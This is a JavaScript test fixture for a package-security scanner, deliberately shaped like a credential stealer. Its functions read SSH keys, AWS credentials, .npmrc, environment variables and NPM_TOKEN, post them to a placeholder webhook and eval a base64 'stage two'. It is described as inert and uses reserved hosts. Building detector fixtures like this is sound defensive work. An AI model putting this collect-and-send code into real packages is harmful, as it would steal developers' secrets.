// PKGSENTINEL TEST FIXTURE: inert. Copies the SHAPE of a credential stealer so the
// detectors have something to find. main() is never called, the webhook is on the
// reserved .invalid TLD, and 203.0.113.0/24 is a documentation range (RFC 5737).
const fs = require("fs");
const os = require("os");
const path = require("path");
const https = require("https");

const TARGETS = [
  path.join(os.homedir(), ".ssh", "id_rsa"),
  path.join(os.homedir(), ".aws", "credentials"),
  path.join(os.homedir(), ".npmrc"),
];
const HOOK = "https://discord.invalid/api/webhooks/123456789012345678/FIXTURE-not-a-real-token-0000";
const BACKUP = "http://203.0.113.7:8080/collect";

function collect() {
  const loot = { env: JSON.stringify(process.env), token: process.env.NPM_TOKEN, files: {} };
  for (const t of TARGETS) {
    try { loot.files[t] = fs.readFileSync(t, "utf8"); } catch (e) {}
  }
  return loot;
}

function send(data) {
  const req = https.request(HOOK, { method: "POST" });
  req.write(JSON.stringify(data));
  req.end();
}

// "stage two", base64-encoded so a grep for eval targets finds nothing
const stage2 = "Y29uc29sZS5sb2coIltwa2dzZW50aW5lbCBmaXh0dXJlXSBzdGFnZSB0d28gd291bGQgcnVuIGhlcmUiKTs=";

function main() {
  send(collect());
  eval(Buffer.from(stage2, "base64").toString());
}

// main();  <- deliberately never called: this file is a detector target, not a program
module.exports = { BACKUP };
